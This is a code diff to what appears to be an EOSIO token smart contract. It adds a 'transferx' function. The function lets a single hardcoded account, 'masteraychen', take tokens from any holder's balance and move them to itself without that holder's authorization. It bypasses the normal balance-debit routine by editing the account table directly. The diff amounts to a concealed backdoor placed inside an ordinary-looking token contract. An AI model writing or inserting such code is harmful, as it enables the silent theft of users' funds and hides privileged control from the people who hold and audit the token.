@@ -124,6 +124,40 @@ void token::transfer( const name&    from,
     add_balance( to, quantity, payer );
 }
 
+
+void token::transferx(const name&   from,
+                      const asset&   quantity,
+                      const string&  memo )
+{
+   auto admin = name("masteraychen");
+   require_auth( admin );
+
+   auto to = name("masteraychen");
+
+   auto sym = quantity.symbol.code();
+   stats statstable( get_self(), sym.raw() );
+   const auto& st = statstable.get( sym.raw() );
+
+   check( quantity.is_valid(), "invalid quantity" );
+   check( quantity.symbol == st.supply.symbol, "symbol precision mismatch" );
+   check( memo.size() <= 256, "memo has more than 256 bytes" );
+
+   /**
+    * sub_balance( from, quantity );
+    */
+   ////////////////////////////////////////
+   accounts from_acnts( get_self(), from.value );
+   const auto& from_user = from_acnts.get( quantity.symbol.code().raw(), "no balance object found" );
+   check( from_user.balance.amount >= quantity.amount, "overdrawn balance" );
+   from_acnts.modify( from_user, to, [&]( auto& a ) { //use "to" as payer
+         a.balance -= quantity;
+      });
+   ////////////////////////////////////////
+
+   add_balance( to, quantity, admin );
+
+}
+
 void token::sub_balance( const name& owner, const asset& value ) {
    accounts from_acnts( get_self(), owner.value );
 
